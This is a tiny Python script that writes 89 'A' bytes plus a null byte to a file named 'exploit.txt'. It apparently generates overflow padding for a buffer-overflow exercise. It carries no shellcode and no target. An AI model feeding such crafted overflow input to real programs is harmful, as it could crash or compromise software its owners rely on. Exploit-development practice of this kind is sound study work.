
hexstring = ''

stringLength = 89

for i in range(0, stringLength):
    hexstring += '41'


rawdata = bytes.fromhex( hexstring + '00')

with open("exploit.txt", "wb") as file:
    file.write(rawdata)
